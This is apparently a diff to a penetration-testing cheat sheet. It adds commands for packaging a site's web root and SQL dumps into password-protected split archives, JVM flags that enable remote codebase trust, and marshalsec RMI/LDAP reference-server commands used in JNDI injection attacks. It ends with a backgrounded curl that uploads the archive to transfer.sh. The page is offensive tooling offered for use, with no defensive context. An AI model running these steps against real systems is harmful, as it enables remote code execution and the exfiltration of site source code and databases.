@@ -9,8 +9,12 @@ hideToc : true
 
 ```bash
 "C:/Program Files/7-Zip/7z.exe" a D:\upload\2020\7\13\www.zip C:\inetpub\wwwroot\ -r -x!*.zip -x!*.7z -v200m
+
 Rar.exe a -r -v500m -X*.rar -X*.zip sst.rar D:\wwwroot\sq\
+
 tar -zcvf /tmp/www.tar.gz --exclude=upload --exclude *.png --exclude *.jpg --exclude *.gif --exclude *.mp* --exclude *.flv --exclude *.m4v --exclude *.pdf --exclude *.*tf --ignore-case /www/ | split -b 100M -d -a - www.tar.gz.
+
+zip -q -P password file.zip *.sql
 ```
 
 ```php
@@ -39,4 +43,17 @@ if($zip->open('/tmp/backup.zip', ZipArchive::OVERWRITE)=== TRUE){
 
 ```
 git submodule update --init --recursive
+```
+
+```
+-Djava.rmi.server.useCodebaseOnly=false -Dcom.sun.jndi.rmi.object.trustURLCodebase=true -Dcom.sun.jndi.ldap.object.trustURLCodebase=true -DsocksProxyHost=IP -DsocksProxyPort=8010
+```
+
+```
+java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://ip:80/#ExportObject 1099
+java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://ip:80/#ExportObject 1099
+```
+
+```
+curl --silent --upload-file file.zip https://transfer.sh/file.zip >> upload.txt &
 ```
